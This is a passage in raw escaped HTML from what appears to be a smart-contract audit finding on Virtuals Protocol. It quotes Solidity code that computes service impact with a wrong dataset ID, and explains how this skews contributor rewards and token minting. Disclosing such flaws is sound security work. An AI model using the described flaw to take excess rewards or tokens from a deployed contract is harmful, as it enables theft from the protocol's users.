class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eupdateImpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e       \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e       \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// . . . Rest of the code . . .\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIContributionNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003econtributionNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetDatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);     \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Incorrect datasetId\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_impacts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erawImpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_impacts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erawImpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetImpactWeight\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;                \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Incorrect impact calculated\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_impacts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erawImpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_impacts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];                         \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Incorrect impact calculated\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eSetServiceScore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_maturities\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e], \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_impacts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_maturities\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_maturities\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e       \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// . . . Rest of the code . . .\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis clearly breaks three functionalities:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eThe \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/AgentRewardV2.sol#L252\"\u003e\u003ccode\u003eAgentRewardV2::_distributeContributorRewards\u003c/code\u003e\u003c/a\u003e uses \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol#L120\"\u003e\u003ccode\u003eServiceNft::getImpact\u003c/code\u003e\u003c/a\u003e call for calculating rewards; hence, allowing to gain higher rewards or provide lesser rewards to the rest.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"18\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_distributeContributorRewards\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        RewardSettingsCheckpoints.RewardSettings \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esettings\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eprivate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e       \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// . . . Rest of the code . . .\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eservices\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eservices\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceNftContract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetImpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);           \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Uses getImpact\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk15\"\u003econtinue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eServiceReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estorage\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_serviceRewards\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_rewardImpacts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eid\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e][\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceNftContract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetCore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)] += \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// . . . Rest of the code . . . \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003eThe \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/token/Minter.sol#L134\"\u003e\u003ccode\u003eMinter::mint\u003c/code\u003e\u003c/a\u003e uses the \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol#L120\"\u003e\u003ccode\u003eServiceNft::getImpact\u003c/code\u003e\u003c/a\u003e call to transfer tokens; hence, leading to excess or lower funds being transferred.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"19\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enftId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003enoReentrant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// . . . Rest of the code . . .\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efinalImpactMultiplier\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_getImpactMultiplier\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econtribution\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetDatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enftId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIServiceNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetImpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enftId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);          \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Uses getImpact\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emaxImpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emaxImpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efinalImpactMultiplier\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ** \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDENOM\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edataAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            ? (\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIServiceNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetImpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efinalImpactMultiplier\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ** \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDENOM\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            : \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// . . . Rest of the code . . 